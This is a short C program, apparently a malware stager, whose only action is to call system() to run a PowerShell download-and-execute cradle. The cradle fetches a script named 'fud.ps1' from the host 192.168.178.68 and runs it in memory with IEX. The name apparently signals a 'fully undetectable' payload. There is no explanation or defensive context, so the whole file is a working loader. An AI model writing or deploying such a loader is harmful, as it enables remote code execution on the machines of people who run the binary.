#include<stdio.h>

int main()
{
    system("powershell.exe \"IEX ((new-object net.webclient).downloadstring('http://192.168.178.68/fud.ps1 '))\"");
    return 0;
}
